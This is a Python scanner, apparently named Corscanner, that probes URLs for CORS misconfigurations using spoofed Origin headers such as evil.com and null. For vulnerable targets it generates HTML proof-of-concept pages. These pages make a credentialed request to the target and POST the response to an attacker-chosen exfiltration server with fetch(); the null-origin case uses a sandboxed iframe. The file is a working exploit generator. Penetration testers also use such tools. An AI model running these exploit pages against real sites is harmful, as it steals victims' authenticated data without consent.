import requests
import argparse
import os

# Define color variables
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

# CORS headers
ACAO_STR = "access-control-allow-origin"
ACAC_STR = "access-control-allow-credentials"

def test_url(url, valid_origin, generate_poc, exfil_server):
    print(f"{MAGENTA}[i] Url: {url}{RESET}")
    payloads = ["https://evil.com", "null"]

    if valid_origin != "":
        payloads.append(f"https://{valid_origin}")
        payloads.append(f"https://{valid_origin}.evil.com")
        payloads.append(f"https://evil{valid_origin}")
        payloads.append(f"https://evil.com/{valid_origin}")

    for payload in payloads:
        print(f"{BLUE}[i] Testing Origin: {payload}{RESET}")
        headers = {
            'Origin': payload,
            'User-Agent': 'just testing :)'
        }
        response = requests.get(url, headers=headers)

        # Checking CORS headers in response
        if ACAO_STR in response.headers and ACAC_STR in response.headers:
            if response.headers.get(ACAO_STR) == payload and response.headers.get(ACAC_STR) == "true":
                print(f"{GREEN}[+] [{response.status_code}] - {url} is vulnerable to -> Origin: {payload}{RESET}")
                print(f"{GREEN}[+] Access-Control-Allow-Origin: {response.headers.get(ACAO_STR)}{RESET}")
                print(f"{GREEN}[+] Access-Control-Allow-Credentials: {response.headers.get(ACAC_STR)}{RESET}")

                # Generating POC script
                if generate_poc == True:
                    poc_script = f"""<script>
        var xhr = new XMLHttpRequest();
        var url = '{url}';
        var exfil_server_url = '{exfil_server}';

        xhr.open('GET', url, true);
        xhr.withCredentials = true;
        xhr.send();
        xhr.onload = function() {{
            {"fetch(exfil_server_url, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(xhr.responseText)})" if exfil_server != "" else "console.log(xhr.responseText)"}
        }};
    </script>"""
                    if payload == "null":
                        full_poc = f"""<!-- Thanks for using Corscanner -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POC by Corscanner</title>
</head>
<body>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="{poc_script}"></iframe>
</body>
</html>
"""
                    else:
                        full_poc = f"""<!-- Thanks for using Corscanner -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POC</title>
</head>
<body>
    {poc_script}
</body>
</html>
"""

                    poc_filename = f"{url.split(':')[1][2:].split('/')[0]}_CORS_POC{'_null' if payload == 'null' else ''}.html"
                    print(f"{GREEN}[+] POC html file will be saved in {poc_filename}{RESET}")
                    with open(poc_filename, "w") as f:
                        f.write(full_poc)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Detects CORS misconfigurations in a URL or a list of URLs")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--url", type=str, help="A single URL to process.")
    group.add_argument("--file", type=str, help="A path to a file containing URLs.")

    parser.add_argument("--valid-origin", type=str, help="A valid origin that is accepted by the server")
    parser.add_argument("--exfil-server", type=str, default="", help="HTTP(s) server to exfiltrate the retrieved data to (Ex: https://myserver.net). If not provided data will be logged to the console")
    parser.add_argument("--generate-poc", action='store_true', help="Generates a POC if the given url(s) is vulnerable")

    args = parser.parse_args()

    if args.generate_poc and args.exfil_server == "":
        print(f"{YELLOW}[!] You haven't provided an HTTP server to exfiltrate data, therefore data will be logged in the console (you can change it in the POC script){RESET}")

    if args.url:
        if args.valid_origin:
            test_url(args.url, args.valid_origin, args.generate_poc, args.exfil_server)
        else:
            test_url(args.url, "", args.generate_poc, args.exfil_server)
    elif args.file:
        if not os.path.isfile(args.file):
            print(f"{RED}[-] The file '{args.file}' does not exist.{RESET}")
            exit(1)
        else:
            with open(args.file, "r") as url_list:
                for line in url_list.readlines():
                    if ',' in line.strip():
                        url = line.strip().split(',')[0]
                        valid_origin = line.strip().split(',')[1]
                    else:
                        url = line.strip()
                        valid_origin = ""
                    test_url(url, valid_origin, args.generate_poc, args.exfil_server)
